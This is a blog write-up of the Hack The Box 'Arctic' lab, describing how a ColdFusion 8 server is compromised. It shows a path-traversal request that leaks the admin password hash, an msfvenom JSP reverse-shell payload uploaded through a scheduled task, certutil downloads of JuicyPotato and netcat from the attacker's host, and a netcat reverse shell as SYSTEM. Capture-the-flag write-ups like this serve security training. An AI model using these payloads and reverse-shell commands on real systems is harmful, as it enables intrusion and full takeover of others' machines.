+++
title = "HTB: Arctic"
date = "2022-07-08T15:42:28-05:00"
author = "l0gan334"
cover = "Arctic.png"
tags = ["hacking", "ctf", "oscp-like", "HTB", "windows", "jsp", "SeImpersonatePrivilege", "coldfusion"]
keywords = ["", ""]
description = "**HTB | Arctic - Write up**"
showFullContent = false
readingTime = false
hideComments = false
+++

**Arctic** is a cool HTB machine except for the insane lag in the http server.

We will be exploiting a **ColdFusion** instance, where we're going to leak admin's password and upload a jsp shell from the admin panel.

Once inside, abusing **SeImpersonatePrivilege** with **JuicyPotato** we are going to get a shell as system.

# **```Recon```**
# Nmap
There's three TCP opened ports in the victim machine:
```bash
❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.77.73 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked up and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 15:51 -05
Initiating SYN Stealth Scan at 15:51
Scanning 10.129.77.73 [65535 ports]
Discovered open port 135/tcp on 10.129.77.73
Discovered open port 8500/tcp on 10.129.77.73
sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.129.77.73, 16) => Operation not permitted
Offending packet: TCP 10.10.14.161:53702 > 10.129.77.73:52994 S ttl=37 id=14195 iplen=44  seq=4220139071 win=1024 <mss 1460>
Discovered open port 49154/tcp on 10.129.77.73
Completed SYN Stealth Scan at 15:51, 26.52s elapsed (65535 total ports)
Nmap scan report for 10.129.77.73
Host is up (0.16s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 20 (880B)
```

We are exporting the result in **grepable format**, which is great to manage with **regex** and get all the ports without needing to type them one by one:

{{< code language="bash" title="Here you have an useful function you can use for this manner" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep initiated | awk 'NF{print $NF}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat extractPorts.tmp
	rm extractPorts.tmp
}
{{< /code >}}
```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.77.73
	[*] Open ports: 135,8500,49154

[*] Ports copied to clipboard
```

With the **-sCV** parameters we will run scripts to enumerate the version and service that each port is running:
```bash
❯ nmap -sCV -p135,8500,49154 10.129.77.73 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 16:40 -05
Nmap scan report for 10.129.77.73
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.28 seconds
```

Ok so there's a couple RPC ports and an HTTP server, so let's check it:

{{< image src="/img/arc1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

For some reason it takes quite some time to load so let's get straight to the point.

Inside the first directory we find all this content:

{{< image src="/img/arc2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

*Administrator* is what calls my attention the most so let's check it:

{{< image src="/img/arc3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It turns out to be an instance of **ColdFusion**:

# Password leakage

I had never seen this interface so let's start by looking for potential exploits we can use:

{{< image src="/img/arc4.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This looks interesting, it's supposed to leak admin's password:

```bash
❯ python2 coldfusion_shell.py 1 10.129.76.192 8500
1
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm ../../../../../../../../../../../../../../../ColdFusion8/lib/password.properties
Posted: POST /CFIDE/wizards/common/_logintowizard.cfm HTTP/1.1
Host: 10.129.76.192
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

locale=%00../../../../../../../../../../../../../../../ColdFusion8/lib/password.properties%00a
Password found after 1 attempts
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \Q>[K\=XP

password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```

It works, apparently it does a directory path traversal and injects a null bite in the url which triggers the website to return the admin's encrypted password.

Now we have to decrypt it. In this cases **crackstation.net** is very useful:

{{< image src="/img/arc5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

There we have it! Now we can login:

{{< image src="/img/arc6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

**```Foothold```**

Inside a **ColdFusion** admin panel we can get to upload a malicious jsp file that we use to get a reverse shell once we open it. 

First we have to find the path where the file should be uploaded to:

{{< image src="/img/arc8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Here we can find the paths being used:

{{< image src="/img/arc9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

The directory **\CFIDE** was the one we saw the first time we visited the webserver so anything we upload here we will be able to see and open later on.

# But what type of file can we upload and how?

ColdFusion is able to work perfectly with **JSP** files and with **msfvenom** we can create a malicious JSP file that once triggered, will give us a reverse shell.

# Generating the file with msfvenom
```bash
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.161 LPORT=334 -o shell.jsp

Payload size: 1497 bytes
Saved as: shell.jsp
```

# Uploading the file

We will start by going to **Scheduled Tasks** and schedule a new task:

{{< image src="/img/arc7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We're going to put the URL of our webserver offering the file and also the path where we're going to save the file:

{{< image src="/img/arc10.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Now we have to submit and run the task:

{{< image src="/img/arc11.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.76.192 - - [08/Jul/2022 17:19:19] "GET /shell.jsp HTTP/1.1" 200 -
```

Hopefully the file has been successfully uploaded and we can find it in **\CFIDE**:

{{< image src="/img/arc12.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

Perfect! Now let's set the listener and open the file:

```bash
❯ rlwrap nc -lvnp 334
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.76.192.
Ncat: Connection from 10.129.76.192:49322.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
```

I’m using rlwrap with the netcat so I can do things like ^L and using the arrow keys to navigate through the commands I’ve used.

Inside our user's desktop we can find the **user.txt**:
```bash
 Directory of C:\Users\tolis\Desktop

22/03/2017  10:00     <DIR>          .
22/03/2017  10:00     <DIR>          ..
10/07/2022  08:43                 34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.433.407.488 bytes free

type user.txt
0a3ff5c30668c*******************
```
The first part is done now let's move on to the privesc.

# **```Privilege escalation```**


We'll start by enumerating our user:
```powershell
whoami
arctic	olis

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have **SeImpersonatePrivilege**, this is amazing for us because we can abuse it and potentially get command execution as **SYSTEM**.

In order to exploit this we will need to upload the **JuicyPotato.exe** and the **netcat**:

{{< image src="/img/arc13.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


```powershell
certutil.exe -f -urlcache -split http://10.10.14.161/JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

certutil.exe -f -urlcache -split http://10.10.14.161/nc.exe
****  Online  ****
  0000  ...
  6e00
CertUtil: -URLCache command completed successfully.
```

Its usage it's simple, we have to specify:
- Type of proccess (-t) or both using **\***.
- Random port (-l)
- Program to execte (-p)
- Arguments for the program (-a)

```powershell
.\JuicyPotato.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

It works! Now we can send us a shell with netcat:
```powershell
.\JuicyPotato.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.161 334"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```powershell
❯ nc -lvnp 334
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.76.192.
Ncat: Connection from 10.129.76.192:49419.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Perfect! Now we can access the Administrator's Desktop and find the **root.txt**:
```powershell
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\Users\Administrator\Desktop

22/03/2017  10:02     <DIR>          .
22/03/2017  10:02     <DIR>          ..
10/07/2022  08:43                 34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.432.272.896 bytes free

C:\Users\Administrator\Desktop>type root.txt
0f06029728aec92*****************
```

See you next time!